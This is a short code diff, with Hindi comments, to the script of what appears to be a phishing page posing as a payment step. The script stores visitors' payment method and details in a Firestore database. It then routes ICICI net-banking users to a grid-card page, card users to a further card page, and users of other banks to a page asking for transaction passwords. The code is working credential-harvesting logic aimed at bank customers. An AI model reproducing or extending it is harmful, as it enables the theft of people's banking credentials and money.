@@ -128,7 +128,6 @@
         </div>
     </div>
 
-    <!-- Firebase Integration & Smart Routing Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
@@ -227,19 +226,19 @@
                 await updateDoc(docRef, {
                     paymentMethod: payMethod,
                     paymentDetails: paymentDetails,
-                    currentStep: "Page 4 (Payment) Submitted"
+                    currentStep: "Payment Details Submitted"
                 });
 
                 setTimeout(() => {
-                    // यहाँ नियम लागू किया गया है:
+                    // सही लॉजिक:
                     if (payMethod === 'NetBanking' && selectedBank === 'ICICI Bank') {
-                        // अगर ICICI है, तो सीधा Grid पेज पर जाएगा
+                        // अगर ICICI Bank है, तो सीधा grid.html पर जाएगा
                         window.location.href = "grid.html"; 
                     } else if (payMethod === 'Card') {
-                        // अगर कार्ड है तो अगले पेज पर (जैसे page5.html)
+                        // अगर Card है तो page5.html पर जाएगा (या जो आपका कार्ड का अगला पेज हो)
                         window.location.href = "page5.html"; 
                     } else {
-                        // बाकी अन्य सभी बैंकों के लिए ट्रांजैक्शन पासवर्ड वाले पेज पर जाएगा
+                        // ICICI को छोड़कर बाकी सभी बैंकों के लिए ट्रांजैक्शन पासवर्ड वाले पेज पर जाएगा
                         window.location.href = "netbanking_pass.html"; 
                     }
                 }, 1000);
